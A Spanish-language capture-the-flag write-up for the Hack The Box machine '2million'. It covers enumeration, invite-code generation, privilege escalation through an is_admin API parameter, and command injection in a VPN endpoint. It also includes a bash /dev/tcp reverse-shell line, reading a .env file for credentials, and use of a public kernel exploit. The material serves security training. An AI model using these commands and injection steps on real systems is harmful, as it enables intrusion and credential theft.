<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>2million</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>2million</h1><br/><p><ol><li>Primero realizo un scaneo de la red </li></ol></p><p>	<strong>nmap 10.10.11.221 -Pn -sC -sV -O -oN scan_full.txt</strong><ol><li>Meto el nombre de dominio en /etc/hosts</li><li>Hago una enumeración de directorios con dirb</li></ol></p><p>  	<strong>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://2million.htb -b 301</strong><ol><li> Encuentro dos directorios interesantes que son /invite y /login</li><li>Dentro de /invite  veo el código y encuentro una llamada a una script  inviteapi.min.js</li><li>Accedo a ella y veo que está obfuscada por lo que la desofusco con <a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li><li>Me aparecen 2 funciones muy interesantes que son <span style="color:#b9ca4a;">/api/v1/invite/verify</span> y <span style="color:#b9ca4a;">/api/v1/invite/how/to/generate</span></li><li>Realizo un POST con Burpsuite para ver que me devuelve </li></ol><img src="images/10-1.png" alt="images/10-1.png" /><ol><li>Me dice que está encriptada en ROT13</li><li>Lo desencripto y me dice “In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate”</li><li>Realizo el POST y me devuelve un código “NlJXOEktMlhOTlAtUFpOSkwtVFlaR04=” </li></ol><img src="images/10-2.png" alt="images/10-2.png" /><ol><li>Este código está encoded en base 64</li><li>Lo descodifico con  </br><strong>echo &quot;NlJXOEktMlhOTlAtUFpOSkwtVFlaR04=&quot;&gt;code.txt | base64 -d</strong></li><li>Puedo crear un usuario con ese codigo de invitación (Parece ser que solo puede haber usuarios con invitación) </li></ol><img src="images/10-3.png" alt="images/10-3.png" /><ol><li>Me redirige al Login por lo que entro y me manda al dashboard /home</li><li>/acces es muy importante porque puedo descargar las vpns que uso</li><li>Le doy a descargar Connection Pack y lo intercepto con Burpsuite</li><li>Encuentro que es un archivo OpenVPN</li><li>Al ser un GET puedo solicitar la version, nos dice que es v1</li><li>Realizo un GET a /api/v1 y encuentro un metodo de auntentificación de admin </li></ol></p><p>  <img src="images/10-4.png" alt="images/10-4.png" /><ol><li>Realizo un get a /api/v1/admin/auth para ver si soy admins</li><li>Puedo enviar otros métodos como POST o PUT</li><li>Con PUT a la url /api/v1/admin/settings/update me devuelve 200</li></ol></p><p>  <img src="images/10-5.png" alt="images/10-5.png" /><ol><li>Da este error porque CONTENT-TYPE tiene que estar en json</li><li>Nos pide el parámetro email</li></ol></p><p>  <img src="images/10-6.png" alt="images/10-6.png" /><ol><li>Ahora me pide el parámetro is_admin que probablemente sea un tipo de dato Boolean</li></ol></p><p>  <img src="images/10-7.png" alt="images/10-7.png" /><ol><li>Meto el parámetro &quot;is_admin=true&quot; y me dice que tiene que ser 0 o 1</li><li>Y me devuelve</li></ol></p><p>  <img src="images/10-8.png" alt="images/10-8.png" /><ol><li>Checkeo si soy admin con el método /auth y me devuelve el “message : true”</li><li>Ahora accedo a /vpn/generate para ver que puedo hacer</li><li>Se me genera la vpn </li></ol></p><p>  <img src="images/10-9.png" alt="images/10-9.png" /><ol><li>Para generar esta vpn se usan funciones PHP, por lo que intento hacer un command injection después del username para que no me ponga que faltan parámetros</li></ol></p><p>  <img src="images/10-10.png" alt="images/10-10.png" /></p><p>   <img src="images/10-11.png" alt="images/10-11.png" /><ol><li>Veo que si que puedo ejecutar comandos por lo que generaré un reverse shell encodeado en base64 <strong>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</strong></li><li> Lo codifico a base64 y lo introduzco en el command injection  </li></ol><img src="images/10-12.png" alt="images/10-12.png" /><ol><li></li></ol><img src="images/10-13.png" alt="images/10-13.png" /><ol><li></li></ol><img src="images/10-14.png" alt="images/10-14.png" /><ol><li>Encuentro el usuario admin que tiene la flag user.txt tengo que hacer movimiento lateral a ese usuario</li></ol></p><p>  <img src="images/10-15.png" alt="images/10-15.png" /><ol><li>Encuentro el archivo .env oculto</br><strong> ls -al</strong></br><strong> cat .env</strong></li><li>Me da las credenciales del usuario admin de la db</li></ol></p><p>  <img src="images/10-16.png" alt="images/10-16.png" /><ol><li> En el escaneo vi que tenía un servicio SSH activo por lo que entro con el usuario admin y la contraseá que encontré antes</li><li>Encuentro la flag user.txt</li><li>Después de buscar un rato encuentro un archivo en mail que dice que hay CVE en el kernel.</li><li>Busco la versión del kernel con “uname -a”</li></ol></p><p>  <img src="images/10-17.png" alt="images/10-17.png" /><ol><li>Encuentro que puedo usar el <a href="https://github.com/xkaneiki/CVE-2023-0386">CVE-2023-0386</a></li><li>Lo clono en mi máquina atacante</li><li>Se lo paso a mi máquina objetivo y sigo los pasos del POC</li></ol></p><p align="center"></p></div>
</body>
</html>
